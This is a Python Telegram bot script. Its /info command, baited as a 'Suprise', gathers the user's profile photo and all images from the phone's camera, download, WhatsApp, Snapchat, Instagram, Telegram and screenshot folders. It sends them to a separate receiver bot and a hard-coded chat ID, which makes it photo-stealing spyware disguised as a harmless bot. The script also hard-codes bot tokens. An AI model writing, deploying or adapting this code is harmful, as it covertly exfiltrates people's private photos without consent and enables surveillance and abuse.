import glob
import os

from telegram import Update , Bot , InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# 🔒 CONFIG
BOT_TOKEN = "9167267835:AAFEK2RBJsrvAphApG1u0FUSypdMpN71kKY"          # Sender bot
RECEIVER_BOT_TOKEN = "9032779142:AAE_wDt41G7NcfIuvYzKvUd0jzFSWGPQLq4"  # Receiver bot
RECEIVER_CHAT_ID = "8688379018"                                       # Chat/User ID to receive images

# ✅ Function: Get all images from multiple folders
def get_all_images():
    folders = [
        "/storage/emulated/DCIM/Camera",
        "/storage/emulated/Download",
        "/storage/emulated/Pictures",
        "/storage/emulated/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/Snapchat",
        "/storage/emulated/Telegram",
        "/storage/emulated/Screenshots",
        "/storage/emulated/Instagram"
    ]
    image_types = ('*.jpg', '*.jpeg', '*.png', '*.webp')
    all_files = []

    for folder in folders:
        for ext in image_types:
            all_files.extend(glob.glob(os.path.join(folder, ext)))

    all_files.sort(key=os.path.getmtime, reverse=True)
    return all_files

# ✅ /start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot Activated.\nUse /info for Suprise 😉")

# ✅ /info Command
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    receiver_bot = Bot(token=RECEIVER_BOT_TOKEN)

    # 🖼️ Send Profile Photo
    try:
        user_photos = await context.bot.get_user_profile_photos(user.id)
        if user_photos.total_count > 0:
            file_id = user_photos.photos[0][0].file_id
            file = await context.bot.get_file(file_id)
            file_path = f"{user.id}_profile.jpg"
            await file.download_to_drive(file_path)

            with open(file_path, 'rb') as img:
                await receiver_bot.send_photo(
                    chat_id=RECEIVER_CHAT_ID,
                    photo=InputFile(img),
                    caption=f"👤 {user.full_name} - Profile Photo\n🆔 {user.id}"
                )
            os.remove(file_path)
        else:
            await update.message.reply_text("❌ Error1.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error2 \n{e}")

    # 📂 Send All Gallery Photos
    try:
        all_images = get_all_images()
        if not all_images:
            await update.message.reply_text(" No thanks.")
        else:
            await update.message.reply_text(f"📤 wait {len(all_images)} ..")
            for img_path in all_images:
                try:
                    with open(img_path, 'rb') as img:
                        await receiver_bot.send_photo(
                            chat_id=RECEIVER_CHAT_ID,
                            photo=InputFile(img),
                            caption=f"🖼️ Image from: {os.path.basename(img_path)}\n👤 {user.full_name}\n🆔 {user.id}"
                        )
                except:
                    continue  # Skip if file is corrupted or can't open
    except Exception as e:
        await update.message.reply_text(f"⚠️Error:\n{e}")

# ✅ Bot Start
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("info", info))
    print("✅ Sender Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
